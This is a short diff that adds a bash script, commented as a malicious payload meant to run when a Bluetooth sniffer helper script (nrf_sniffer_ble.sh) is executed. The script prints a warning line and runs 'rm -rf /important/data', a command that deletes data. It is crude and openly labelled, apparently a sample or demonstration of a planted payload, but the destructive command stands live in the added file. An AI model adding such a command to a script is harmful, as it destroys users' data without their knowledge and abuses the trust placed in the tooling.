@@ -1,0 +1,7 @@
+```bash
+#!/bin/bash
+# Malicious payload to be executed when nrf_sniffer_ble.sh is run
+echo "This is a malicious script that can execute arbitrary commands."
+# Example of a command that could be run
+rm -rf /important/data
+```
